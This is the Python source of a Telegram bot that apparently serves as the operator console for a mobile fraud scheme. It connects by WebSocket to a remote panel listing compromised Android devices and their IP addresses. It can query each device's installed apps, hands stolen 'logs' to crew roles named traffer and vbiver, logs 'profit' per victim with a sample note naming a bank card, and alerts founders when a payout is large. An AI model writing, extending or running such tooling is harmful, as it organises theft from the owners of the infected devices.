import os
import re
import asyncio
import json
import logging
import contextlib
from pathlib import Path
from datetime import datetime, timedelta, timezone
from collections import defaultdict, Counter

from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command
from aiogram.types import (
    Message, CallbackQuery, BotCommand,
    InlineKeyboardMarkup, InlineKeyboardButton,
)
import websockets

# ---------- CONFIG ----------
load_dotenv(dotenv_path=Path(__file__).with_name(".env"))

# Telegram
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip().isdigit()}
ALLOWED_CHAT_IDS = {int(x) for x in os.getenv("ALLOWED_CHAT_IDS", "").split(",") if x.strip().lstrip("-").isdigit()}

# Roles
FOUNDER_IDS = {int(x) for x in os.getenv("FOUNDER_IDS", "").split(",") if x.strip().isdigit()}
VBIVER_IDS  = {int(x) for x in os.getenv("VBIVER_IDS", "").split(",")  if x.strip().isdigit()}
TRAFFER_IDS = {int(x) for x in os.getenv("TRAFFER_IDS", "").split(",") if x.strip().isdigit()}

ROLE_TRAFFER = 1
ROLE_VBIVER  = 2
ROLE_FOUNDER = 3

# WebSocket
WS_URL = os.getenv("WS_URL", "")
AUTH_TYPE = (os.getenv("WS_AUTH_TYPE", "cookie") or "cookie").lower()  # cookie|bearer|protocol|none
WS_TOKEN = os.getenv("WS_TOKEN", "")
WS_COOKIE = os.getenv("WS_COOKIE", "")
WS_ORIGIN = os.getenv("WS_ORIGIN", "https://zam.claydc.top")

WS_INIT_AUTH_JSON = os.getenv("WS_INIT_AUTH_JSON", "")
WS_AUTH_OK_EVENT = (os.getenv("WS_AUTH_OK_EVENT", "welcome") or "welcome").strip().lower()

WS_USER_AGENT = os.getenv("WS_USER_AGENT", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36")
WS_ACCEPT_LANGUAGE = os.getenv("WS_ACCEPT_LANGUAGE", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
WS_CACHE_CONTROL = os.getenv("WS_CACHE_CONTROL", "no-cache")
WS_PRAGMA = os.getenv("WS_PRAGMA", "no-cache")

# Business settings
BIG_PROFIT = int(os.getenv("BIG_PROFIT", "5000"))

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("clonnex")


def allowed_chat(chat_id: int) -> bool:
    return (not ALLOWED_CHAT_IDS) or (chat_id in ALLOWED_CHAT_IDS)


def is_admin(uid: int, chat_id: int) -> bool:
    return ((not ADMIN_IDS) or (uid in ADMIN_IDS)) and allowed_chat(chat_id)


def role_level(uid: int) -> int:
    if uid in FOUNDER_IDS:
        return ROLE_FOUNDER
    if uid in VBIVER_IDS:
        return ROLE_VBIVER
    if uid in TRAFFER_IDS:
        return ROLE_TRAFFER
    return 0


# ---------- RUNTIME STATE ----------
DEVICES: dict[str, dict] = {}     # devices cache
BLACKLIST_UUIDS: set[str] = set()

# Логи (минимальная in-memory схема)
# uuid -> dict(
#   uuid, raw, quarantined, assigned_to, assigned_at, worker, operator,
#   trafer_id, meta{... source/ref/ip/model/android ...}, ts,
#   profit (float), profit_note (str), profited_at (iso)
# )
LOGS: dict[str, dict] = {}

# ожидания ввода от пользователя
PENDING_PROFIT: dict[int, str] = {}     # user_id -> uuid
# билдер: {uid: {"mode": "name"/"text", "buffer": {"name":...}}}
BUILDER_STATE: dict[int, dict] = {}
# личные шаблоны: uid -> [{name, text, created_at}]
TEMPLATES: defaultdict[int, list] = defaultdict(list)

# regex на permission denied
RE_DENIED = re.compile(r"\bpermission\s+denied\b", re.I)


# ---------- UI HELPERS ----------
def kb_main(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⚙️ Ворк-панель", callback_data="menu:work")]
    ])


def kb_work(uid: int) -> InlineKeyboardMarkup:
    lvl = role_level(uid)
    rows = []
    if lvl >= ROLE_TRAFFER:
        rows.append([InlineKeyboardButton(text="📬 Трафф-панель", callback_data="work:tr")])
    if lvl >= ROLE_VBIVER:
        rows.append([InlineKeyboardButton(text="🧲 Вбив-панель", callback_data="work:vb")])
    if lvl >= ROLE_FOUNDER:
        rows.append([InlineKeyboardButton(text="🛠 Админ-панель", callback_data="work:admin")])
    rows.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="menu:root")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def kb_admin(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🟡 Заявки", callback_data="admin:requests")],
        [InlineKeyboardButton(text="👷 Вбиверы", callback_data="admin:vbivers")],
        [InlineKeyboardButton(text="📊 Отчёты", callback_data="admin:reports")],
        [InlineKeyboardButton(text="🧰 Шаблоны причин", callback_data="admin:reasons")],
        [InlineKeyboardButton(text="⛔ Blacklist UUID", callback_data="admin:blacklist")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu:work")]
    ])


def kb_vb(uid: int, has_active: bool) -> InlineKeyboardMarkup:
    rows = [
        [InlineKeyboardButton(text="🧲 Получить лог", callback_data="vb:get")],
        [InlineKeyboardButton(text="📦 Мой лог", callback_data="vb:my")],
    ]
    if has_active:
        rows.append([
            InlineKeyboardButton(text="💬 СМС", callback_data="vb:sms"),
            InlineKeyboardButton(text="💰 Профит", callback_data="vb:profit"),
            InlineKeyboardButton(text="🔓 Освободить", callback_data="vb:free"),
        ])
    rows.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="menu:work")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def kb_tr(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✉️ Мои входящие", callback_data="tr:inbox")],
        [InlineKeyboardButton(text="🚫 Ошибки доступа", callback_data="tr:denied")],
        [InlineKeyboardButton(text="📈 Мои источники", callback_data="tr:sources")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="tr:stats")],
        [InlineKeyboardButton(text="🧱 Билдер", callback_data="tr:builder")],
        [InlineKeyboardButton(text="📚 Гайд/FAQ", callback_data="tr:faq")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu:work")],
    ])


def kb_tr_stats(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="24h", callback_data="tr:stats:24h"),
            InlineKeyboardButton(text="7d",  callback_data="tr:stats:7d"),
            InlineKeyboardButton(text="30d", callback_data="tr:stats:30d"),
            InlineKeyboardButton(text="All", callback_data="tr:stats:all"),
        ],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="work:tr")],
    ])


def kb_builder(uid: int) -> InlineKeyboardMarkup:
    kb = []
    # список шаблонов
    if TEMPLATES[uid]:
        for i, t in enumerate(TEMPLATES[uid][:10], 1):
            kb.append([InlineKeyboardButton(text=f"📄 {t['name']}", callback_data=f"builder:view:{i-1}")])
    kb.append([InlineKeyboardButton(text="➕ Создать шаблон", callback_data="builder:new")])
    kb.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="work:tr")])
    return InlineKeyboardMarkup(inline_keyboard=kb)


async def setup_bot_commands(bot: Bot) -> None:
    await bot.set_my_commands([
        BotCommand(command="start", description="Запуск"),
        BotCommand(command="menu",  description="Ворк-панель"),
        BotCommand(command="ping",  description="Проверка"),
        BotCommand(command="devices", description="Список устройств"),
        BotCommand(command="device",  description="Карточка устройства"),
        BotCommand(command="apps",    description="Список приложений"),
        BotCommand(command="whoami",  description="Мой user_id"),
        BotCommand(command="whereami",description="ID чата"),
        BotCommand(command="profit",  description="Профит по UUID"),
    ])


# ---------- WS CLIENT ----------
class WSClient:
    def __init__(self, bot: Bot) -> None:
        self.ws: websockets.WebSocketClientProtocol | None = None
        self.auth_ok: bool = False
        self.bot = bot

    def _conn_args(self) -> dict:
        k: dict = {}
        headers: dict[str, str] = {}
        if AUTH_TYPE == "bearer" and WS_TOKEN:
            headers["Authorization"] = f"Bearer {WS_TOKEN}"
        elif AUTH_TYPE == "cookie" and WS_COOKIE:
            headers["Cookie"] = WS_COOKIE
        if WS_ORIGIN:          headers["Origin"] = WS_ORIGIN
        if WS_USER_AGENT:      headers["User-Agent"] = WS_USER_AGENT
        if WS_ACCEPT_LANGUAGE: headers["Accept-Language"] = WS_ACCEPT_LANGUAGE
        if WS_CACHE_CONTROL:   headers["Cache-Control"] = WS_CACHE_CONTROL
        if WS_PRAGMA:          headers["Pragma"] = WS_PRAGMA
        if headers:
            k["extra_headers"] = headers
        if AUTH_TYPE == "protocol" and WS_TOKEN:
            toks = [t.strip() for t in WS_TOKEN.split(",") if t.strip()]
            k["subprotocols"] = toks or [WS_TOKEN]
        return k

    async def run(self) -> None:
        if not WS_URL:
            log.error("WS_URL пуст")
            await asyncio.Future()

        backoff = 1
        while True:
            try:
                log.info("WS connecting → %s", WS_URL)
                async with websockets.connect(
                    WS_URL, ping_interval=20, ping_timeout=20, **self._conn_args()
                ) as ws:
                    self.ws = ws
                    self.auth_ok = False
                    log.info("WS connected; protocol=%s", ws.subprotocol or "-")

                    if WS_INIT_AUTH_JSON:
                        await ws.send(WS_INIT_AUTH_JSON)
                        log.info("WS sent init auth json")

                    asyncio.create_task(self._auth_watchdog())

                    async for raw in ws:
                        try:
                            data = json.loads(raw)
                        except Exception:
                            data = {"type": "raw", "payload": raw}

                        t = (data.get("type") or "").lower()
                        evt = (data.get("event") or "").lower()

                        if not self.auth_ok:
                            ok_by_env = (WS_AUTH_OK_EVENT and (t == WS_AUTH_OK_EVENT or evt == WS_AUTH_OK_EVENT))
                            ok_by_event = evt in {"welcome", "clients_update", "client_update", "log_upsert"}
                            ok_by_type = t in {"device_status", "device_info", "apps_list", "log", "sms_incoming", "sms_result"}
                            if ok_by_env or ok_by_event or ok_by_type:
                                self.auth_ok = True
                                log.info("AUTH OK ✅")

                        await self._handle(data)

            except websockets.InvalidStatusCode as e:
                hdrs = getattr(e, "headers", None)
                log.warning("WS InvalidStatusCode: %s; headers=%s; reconnect in %ss", e.status_code, hdrs, backoff)
                await asyncio.sleep(backoff)
                backoff = min(backoff * 2, 30)
            except Exception as e:
                log.warning("WS error: %r; reconnect in %ss", e, backoff)
                await asyncio.sleep(backoff)
                backoff = min(backoff * 2, 30)

    async def _auth_watchdog(self) -> None:
        await asyncio.sleep(5)
        if not self.auth_ok:
            log.error("AUTH not confirmed in 5s — проверь .env")

    async def _handle(self, data: dict) -> None:
        t = (data.get("type") or "").lower()
        evt = (data.get("event") or "").lower()

        if evt == "clients_update" and isinstance(data.get("clients"), list):
            for c in data["clients"]:
                dev_id = c.get("ID") or c.get("UUID") or c.get("id") or c.get("uuid")
                if not dev_id:
                    continue
                DEVICES.setdefault(dev_id, {}).update({
                    "name":            c.get("DeviceName"),
                    "model":           c.get("DeviceModel"),
                    "android":         c.get("AndroidVersion"),
                    "battery":         c.get("BatteryLevel"),
                    "ip":              c.get("IP") or c.get("IPAddress"),
                    "status":          "online" if c.get("IsConnected") else "offline",
                    "screen":          "on" if c.get("IsScreenOn") else "off",
                    "worker":          c.get("worker_name"),
                    "client":          c.get("ClientType"),
                    "connection":      c.get("ConnectionMethod") or c.get("ConnectionType"),
                    "last_seen":       c.get("FormattedLastSeen") or c.get("LastSeen"),
                    "connected_for":   c.get("FormatTimeConnected"),
                    "webview_url":     c.get("webview_url"),
                    "tag":             c.get("Tag"),
                })
            log.info("[cache] devices updated: %d", len(DEVICES))
            return

        if evt == "log_upsert" or t == "log_upsert":
            uuid = data.get("uuid") or data.get("UUID")
            if not uuid:
                log.info("[WS recv] log_upsert without uuid: %s", data)
                return

            raw = data.get("raw") or ""
            raw_norm = " ".join(str(raw).lower().replace("•", "").split())
            denied = bool(RE_DENIED.search(raw_norm))

            meta = data.get("meta") or {}
            worker = data.get("worker") or meta.get("worker")
            operator = data.get("operator") or meta.get("operator")
            trafer_uid = data.get("traffer_user_id") or meta.get("traffer_user_id")
            ts = data.get("ts") or datetime.now(timezone.utc).isoformat()

            LOGS[uuid] = {
                "uuid": uuid,
                "raw": raw,
                "quarantined": denied,
                "assigned_to": None,
                "assigned_at": None,
                "worker": worker,
                "operator": operator,
                "trafer_id": trafer_uid,
                "meta": meta,
                "ts": ts,
                "profit": 0.0,
                "profit_note": "",
                "profited_at": None,
            }

            if denied:
                text = (
                    f"🚫 <b>Лог с ошибкой доступа</b>\n"
                    f"UUID: <code>{uuid}</code>\n"
                    f"Обнаружено: <code>permission denied</code>\n\n"
                    f"Проверь источник/аккаунт и права. "
                    f"После фикса открой Трафф-панель → «Ошибки доступа» и отметь исправленным."
                )
                if trafer_uid:
                    try:
                        await self.bot.send_message(trafer_uid, text, parse_mode="HTML")
                    except Exception as e:
                        log.warning("notify trafer failed: %r", e)
            return

        log.info("[WS recv] %s", data)

    async def send(self, obj: dict) -> None:
        if not self.ws:
            log.warning("WS not connected; drop send: %s", obj)
            return
        await self.ws.send(json.dumps(obj))
        log.info("[WS send] %s", obj)


# ---------- HELPERS (stats/format) ----------
def _parse_iso(ts: str | None) -> datetime | None:
    if not ts:
        return None
    try:
        return datetime.fromisoformat(ts.replace("Z", "+00:00"))
    except Exception:
        return None

def logs_for_trafer(uid: int, since: datetime | None = None):
    for v in LOGS.values():
        if v.get("trafer_id") != uid:
            continue
        t = _parse_iso(v.get("ts"))
        if since and t and t < since:
            continue
        yield v

def compute_stats(uid: int, period: str = "24h") -> dict:
    now = datetime.now(timezone.utc)
    if period == "24h":
        since = now - timedelta(hours=24)
    elif period == "7d":
        since = now - timedelta(days=7)
    elif period == "30d":
        since = now - timedelta(days=30)
    else:
        since = None

    items = list(logs_for_trafer(uid, since))
    total = len(items)
    denied = sum(1 for v in items if v.get("quarantined"))
    live = total - denied
    assigned = sum(1 for v in items if v.get("assigned_to"))
    profited = [v for v in items if (v.get("profit") or 0) > 0]
    profit_count = len(profited)
    profit_sum = sum(float(v.get("profit") or 0) for v in profited)
    profit_avg = (profit_sum / profit_count) if profit_count else 0.0

    # средние задержки
    assign_deltas, profit_deltas = [], []
    for v in items:
        t0 = _parse_iso(v.get("ts"))
        ta = _parse_iso(v.get("assigned_at"))
        tp = _parse_iso(v.get("profited_at"))
        if t0 and ta:
            assign_deltas.append((ta - t0).total_seconds())
        if t0 and tp:
            profit_deltas.append((tp - t0).total_seconds())

    def _fmt_sec(x):
        if not x:
            return "-"
        m, s = divmod(int(x), 60); h, m = divmod(m, 60)
        return f"{h}ч {m}м"

    assign_avg = _fmt_sec(sum(assign_deltas)/len(assign_deltas) if assign_deltas else 0)
    profit_avg_time = _fmt_sec(sum(profit_deltas)/len(profit_deltas) if profit_deltas else 0)

    # источники
    top_src = Counter((v.get("meta") or {}).get("source") or (v.get("meta") or {}).get("ref") or "—" for v in items)
    top_lines = [f"• {name}: {cnt}" for name, cnt in top_src.most_common(5)]

    live_rate = (live / total * 100) if total else 0.0
    conv_to_profit = (profit_count / total * 100) if total else 0.0

    return {
        "period": period,
        "total": total,
        "denied": denied,
        "live": live,
        "assigned": assigned,
        "profit_count": profit_count,
        "profit_sum": profit_sum,
        "profit_avg": profit_avg,
        "live_rate": live_rate,
        "conv_to_profit": conv_to_profit,
        "assign_avg": assign_avg,
        "profit_avg_time": profit_avg_time,
        "top_src_lines": top_lines,
    }


def render_stats(s: dict) -> str:
    return (
        f"📊 <b>Статистика ({s['period']})</b>\n"
        f"Всего логов: <b>{s['total']}</b>\n"
        f"Denied: <b>{s['denied']}</b> • Live: <b>{s['live']}</b> (<i>{s['live_rate']:.0f}%</i>)\n"
        f"Назначено: <b>{s['assigned']}</b>\n"
        f"Профиты: <b>{s['profit_count']}</b> / <b>{s['profit_sum']:.0f}</b> (avg {s['profit_avg']:.0f})\n"
        f"Средн. до назначения: <b>{s['assign_avg']}</b>\n"
        f"Средн. до профита: <b>{s['profit_avg_time']}</b>\n\n"
        f"<b>Топ источников</b>:\n" + ("\n".join(s['top_src_lines']) or "—")
    )


# ---------- TELEGRAM ----------
router = Router()

def ensure_access(m: Message | CallbackQuery) -> bool:
    if isinstance(m, Message):
        return allowed_chat(m.chat.id)
    return allowed_chat(m.message.chat.id)

@router.message(Command("whoami"))
async def whoami(m: Message):
    await m.answer(f"user_id: {m.from_user.id}\nchat_id: {m.chat.id}")

@router.message(Command("whereami"))
async def whereami(m: Message):
    await m.answer(f"chat_id: {m.chat.id}")

@router.message(Command("start"))
async def start(m: Message):
    if not ensure_access(m):
        return
    await m.answer("я жив. /ping /devices /device <id> /apps <id> — смотри WS в консоли",
                   reply_markup=kb_main(m.from_user.id))

@router.message(Command("menu"))
async def menu_cmd(m: Message):
    if not ensure_access(m):
        return
    await m.answer("⚙️ Ворк-панель", reply_markup=kb_work(m.from_user.id))

@router.message(Command("ping"))
async def ping(m: Message):
    if not ensure_access(m):
        return
    await m.answer("pong")

@router.message(Command("devices"))
async def devices(m: Message):
    if not ensure_access(m):
        return
    if not DEVICES:
        await m.answer("пока нет данных. как только WS пришлёт статусы, они появятся.")
        return
    lines = []
    for d, v in list(DEVICES.items())[:60]:
        name = v.get("name") or v.get("model") or "?"
        status = v.get("status", "?")
        worker = v.get("worker") or ""
        lines.append(f"• <code>{d}</code> — {name} — {status}" + (f" — {worker}" if worker else ""))
    if len(DEVICES) > 60:
        lines.append(f"…и ещё {len(DEVICES)-60}")
    await m.answer("\n".join(lines), parse_mode="HTML")

@router.message(Command("device"))
async def device(m: Message, ws: WSClient):
    if not ensure_access(m):
        return
    parts = m.text.split(maxsplit=1)
    if len(parts) < 2:
        await m.answer("используй: /device <id>")
        return
    dev = parts[1].strip()
    v = DEVICES.get(dev, {})
    text = (
        f"<b>{v.get('name') or v.get('model', '?')}</b>\n"
        f"Android: {v.get('android', '?')}  •  Статус: {v.get('status', '?')}  •  Экран: {v.get('screen', '?')}\n"
        f"IP: {v.get('ip', '?')}  •  Соединение: {v.get('connection', '?')}\n"
        f"Работник: {v.get('worker', '-')}\n"
        f"Послед. активность: {v.get('last_seen', '-')}\n"
        f"Онлайн: {v.get('connected_for', '-')}\n"
    )
    await m.answer(text, parse_mode="HTML")
    await ws.send({"type": "cmd", "action": "device_info_get", "device_id": dev})

@router.message(Command("apps"))
async def apps(m: Message, ws: WSClient):
    if not ensure_access(m):
        return
    parts = m.text.split()
    if len(parts) < 2:
        await m.answer("используй: /apps <device_id>")
        return
    dev = parts[1]
    await m.answer("запросил список приложений; смотри логи консоли.")
    await ws.send({"type": "cmd", "action": "apps_list_get", "device_id": dev})

# Профит: /profit <uuid> <amount> [note...]
@router.message(Command("profit"))
async def cmd_profit(m: Message):
    if role_level(m.from_user.id) < ROLE_VBIVER or not ensure_access(m):
        return
    parts = m.text.split(maxsplit=2)
    if len(parts) < 3:
        await m.answer("используй: /profit <uuid> <amount> [note]")
        return
    uuid, amount = parts[1], parts[2].split()[0]
    try:
        amount_val = float(amount.replace(",", "."))
    except Exception:
        await m.answer("сумма некорректна")
        return
    if uuid not in LOGS or LOGS[uuid].get("assigned_to") != m.from_user.id:
        await m.answer("этот uuid не в твоих активных логах")
        return
    note = parts[2][len(amount):].strip() if len(parts) >= 3 else ""
    LOGS[uuid]["profit"] = amount_val
    LOGS[uuid]["profit_note"] = note
    LOGS[uuid]["profited_at"] = datetime.now(timezone.utc).isoformat()
    await m.answer(f"✅ профит {amount_val:.0f} сохранён для {uuid}")

    if amount_val >= BIG_PROFIT:
        for fid in FOUNDER_IDS:
            with contextlib.suppress(Exception):
                await m.bot.send_message(fid, f"💥 Крупный профит: <b>{amount_val:.0f}</b>\nUUID: <code>{uuid}</code>",
                                         parse_mode="HTML")

# ---------- INLINE NAVIGATION ----------
router_cb = router.callback_query

@router_cb(F.data == "menu:root")
async def cb_root(c: CallbackQuery):
    await c.message.edit_text("главное меню", reply_markup=kb_main(c.from_user.id))
    await c.answer()

@router_cb(F.data == "menu:work")
async def cb_work(c: CallbackQuery):
    if role_level(c.from_user.id) == 0:
        await c.answer("нет доступа", show_alert=True)
        return
    await c.message.edit_text("⚙️ Ворк-панель", reply_markup=kb_work(c.from_user.id))
    await c.answer()

# --- Admin panel (founder only)
@router_cb(F.data == "work:admin")
async def cb_admin(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_FOUNDER:
        await c.answer("только для founder", show_alert=True)
        return
    await c.message.edit_text("🛠 Админ-панель", reply_markup=kb_admin(c.from_user.id))
    await c.answer()

# --- VB panel
@router_cb(F.data == "work:vb")
async def cb_vb(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_VBIVER:
        await c.answer("нет доступа", show_alert=True)
        return
    has_active = any(v.get("assigned_to") == c.from_user.id for v in LOGS.values())
    await c.message.edit_text("🧲 Вбив-панель", reply_markup=kb_vb(c.from_user.id, has_active))
    await c.answer()

@router_cb(F.data == "vb:get")
async def cb_vb_get(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_VBIVER:
        await c.answer("нет доступа", show_alert=True); return
    if any(v.get("assigned_to") == c.from_user.id for v in LOGS.values()):
        await c.answer("у тебя уже есть активный лог", show_alert=True); return
    for uuid, v in LOGS.items():
        if v.get("assigned_to") is None and not v.get("quarantined") and uuid not in BLACKLIST_UUIDS:
            v["assigned_to"] = c.from_user.id
            v["assigned_at"] = datetime.now(timezone.utc).isoformat()
            await c.message.edit_text(
                f"📦 <b>Выдан лог</b>\nUUID: <code>{uuid}</code>\n"
                f"Воркер: {v.get('worker') or '-'} • Оператор: {v.get('operator') or '-'}",
                parse_mode="HTML",
                reply_markup=kb_vb(c.from_user.id, has_active=True),
            )
            await c.answer("лог выдан"); return
    await c.answer("свободных логов нет", show_alert=True)

@router_cb(F.data == "vb:my")
async def cb_vb_my(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_VBIVER:
        await c.answer("нет доступа", show_alert=True); return
    for uuid, v in LOGS.items():
        if v.get("assigned_to") == c.from_user.id:
            text = (
                f"📦 <b>Мой лог</b>\nUUID: <code>{uuid}</code>\n"
                f"Воркер: {v.get('worker') or '-'} • Оператор: {v.get('operator') or '-'}\n"
                f"Выдан: {v.get('assigned_at') or '-'}"
            )
            await c.message.edit_text(text, parse_mode="HTML", reply_markup=kb_vb(c.from_user.id, has_active=True))
            await c.answer(); return
    await c.answer("активного лога нет", show_alert=True)

@router_cb(F.data == "vb:free")
async def cb_vb_free(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_VBIVER:
        await c.answer("нет доступа", show_alert=True); return
    for uuid, v in LOGS.items():
        if v.get("assigned_to") == c.from_user.id:
            v["assigned_to"] = None
            v["assigned_at"] = None
            await c.message.edit_text("лог освобождён", reply_markup=kb_vb(c.from_user.id, has_active=False))
            await c.answer("освобожден"); return
    await c.answer("активного лога нет", show_alert=True)

@router_cb(F.data == "vb:sms")
async def cb_vb_sms(c: CallbackQuery):
    await c.answer("СМС-панель в разработке", show_alert=True)

@router_cb(F.data == "vb:profit")
async def cb_vb_profit(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_VBIVER:
        await c.answer("нет доступа", show_alert=True); return
    for uuid, v in LOGS.items():
        if v.get("assigned_to") == c.from_user.id:
            PENDING_PROFIT[c.from_user.id] = uuid
            await c.message.edit_text("💰 Введите сумму профита (и опционально заметку) одним сообщением.\nПример: <code>2500 карта тиньк</code>",
                                      parse_mode="HTML", reply_markup=kb_vb(c.from_user.id, has_active=True))
            await c.answer(); return
    await c.answer("активного лога нет", show_alert=True)

# захват сообщения для ввода суммы профита
@router.message(F.text)
async def capture_profit(m: Message):
    uid = m.from_user.id
    if uid in PENDING_PROFIT:
        uuid = PENDING_PROFIT.pop(uid)
        parts = m.text.strip().split(maxsplit=1)
        try:
            amount = float(parts[0].replace(",", "."))
        except Exception:
            await m.answer("сумма некорректна"); return
        note = parts[1] if len(parts) > 1 else ""
        v = LOGS.get(uuid)
        if not v or v.get("assigned_to") != uid:
            await m.answer("лог уже недоступен"); return
        v["profit"] = amount
        v["profit_note"] = note
        v["profited_at"] = datetime.now(timezone.utc).isoformat()
        await m.answer(f"✅ профит {amount:.0f} сохранён для {uuid}")
        if amount >= BIG_PROFIT:
            for fid in FOUNDER_IDS:
                with contextlib.suppress(Exception):
                    await m.bot.send_message(fid, f"💥 Крупный профит: <b>{amount:.0f}</b>\nUUID: <code>{uuid}</code>",
                                             parse_mode="HTML")

# --- Traff panel
@router_cb(F.data == "work:tr")
async def cb_tr(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("нет доступа", show_alert=True); return
    await c.message.edit_text("📬 Трафф-панель", reply_markup=kb_tr(c.from_user.id))
    await c.answer()

@router_cb(F.data == "tr:denied")
async def cb_tr_denied(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("нет доступа", show_alert=True); return
    items = []
    for uuid, v in LOGS.items():
        if v.get("quarantined"):
            tid = v.get("trafer_id")
            if tid and tid != c.from_user.id and c.from_user.id not in FOUNDER_IDS:
                continue
            items.append(f"• <code>{uuid}</code> — {v.get('operator') or '-'}")
    if not items:
        await c.message.edit_text("🚫 Ошибочных логов нет", reply_markup=kb_tr(c.from_user.id), parse_mode="HTML")
    else:
        await c.message.edit_text("🚫 <b>Логи с ошибкой доступа</b>\n" + "\n".join(items),
                                  reply_markup=kb_tr(c.from_user.id), parse_mode="HTML")
    await c.answer()

@router_cb(F.data == "tr:inbox")
async def cb_tr_inbox(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("нет доступа", show_alert=True); return
    await c.message.edit_text("✉️ Входящие: (заглушка)\nСкоро тут будет список новых логов.",
                              reply_markup=kb_tr(c.from_user.id))
    await c.answer()

@router_cb(F.data == "tr:sources")
async def cb_tr_sources(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("нет доступа", show_alert=True); return
    stats = compute_stats(c.from_user.id, "30d")
    await c.message.edit_text("📈 Источники (30d):\n" + ("\n".join(stats["top_src_lines"]) or "—"),
                              reply_markup=kb_tr(c.from_user.id))
    await c.answer()

@router_cb(F.data == "tr:stats")
async def cb_tr_stats_root(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("нет доступа", show_alert=True); return
    await c.message.edit_text("Выберите период:", reply_markup=kb_tr_stats(c.from_user.id))
    await c.answer()

@router_cb(F.data.startswith("tr:stats:"))
async def cb_tr_stats(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("нет доступа", show_alert=True); return
    period = c.data.split(":")[2]
    s = compute_stats(c.from_user.id, period)
    await c.message.edit_text(render_stats(s), parse_mode="HTML", reply_markup=kb_tr_stats(c.from_user.id))
    await c.answer()

@router_cb(F.data == "tr:faq")
async def cb_tr_faq(c: CallbackQuery):
    await c.message.edit_text("📚 Гайд/FAQ: (заглушка)\nКороткие подсказки по источникам и качеству трафика.",
                              reply_markup=kb_tr(c.from_user.id))
    await c.answer()

# --- Builder
@router_cb(F.data == "tr:builder")
async def cb_tr_builder(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("нет доступа", show_alert=True); return
    await c.message.edit_text("🧱 Билдер шаблонов", reply_markup=kb_builder(c.from_user.id))
    await c.answer()

@router_cb(F.data == "builder:new")
async def cb_builder_new(c: CallbackQuery):
    BUILDER_STATE[c.from_user.id] = {"mode": "name", "buffer": {}}
    txt = ("🧱 Новый шаблон\n"
           "Отправь <b>название</b> шаблона одним сообщением.\n"
           "Доступные плейсхолдеры в тексте:\n"
           "<code>{uuid} {operator} {ip} {model} {android} {worker}</code>")
    await c.message.edit_text(txt, parse_mode="HTML")
    await c.answer()

@router_cb(F.data.startswith("builder:view:"))
async def cb_builder_view(c: CallbackQuery):
    idx = int(c.data.split(":")[2])
    tpls = TEMPLATES[c.from_user.id]
    if idx < 0 or idx >= len(tpls):
        await c.answer("не найдено", show_alert=True); return
    t = tpls[idx]
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🗑 Удалить", callback_data=f"builder:del:{idx}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="tr:builder")],
    ])
    await c.message.edit_text(f"📄 <b>{t['name']}</b>\n\n<code>{t['text']}</code>",
                              parse_mode="HTML", reply_markup=kb)
    await c.answer()

@router_cb(F.data.startswith("builder:del:"))
async def cb_builder_del(c: CallbackQuery):
    idx = int(c.data.split(":")[2])
    tpls = TEMPLATES[c.from_user.id]
    if 0 <= idx < len(tpls):
        t = tpls.pop(idx)
        await c.message.edit_text(f"🗑 Удалён: <b>{t['name']}</b>", parse_mode="HTML",
                                  reply_markup=kb_builder(c.from_user.id))
    else:
        await c.answer("не найдено", show_alert=True)
    await c.answer()

# захват текстов для билдер-мастера
@router.message(F.text)
async def builder_capture(m: Message):
    st = BUILDER_STATE.get(m.from_user.id)
    if not st:
        return  # другие текстовые обработчики выше уже перехватывают /profit и т.п.
    if st["mode"] == "name":
        st["buffer"]["name"] = m.text.strip()[:64]
        st["mode"] = "text"
        await m.answer("Отправь <b>текст шаблона</b>. Можно использовать плейсхолдеры:\n"
                       "<code>{uuid} {operator} {ip} {model} {android} {worker}</code>",
                       parse_mode="HTML")
        return
    if st["mode"] == "text":
        text = m.text
        name = st["buffer"]["name"]
        TEMPLATES[m.from_user.id].insert(0, {"name": name, "text": text, "created_at": datetime.now(timezone.utc).isoformat()})
        BUILDER_STATE.pop(m.from_user.id, None)
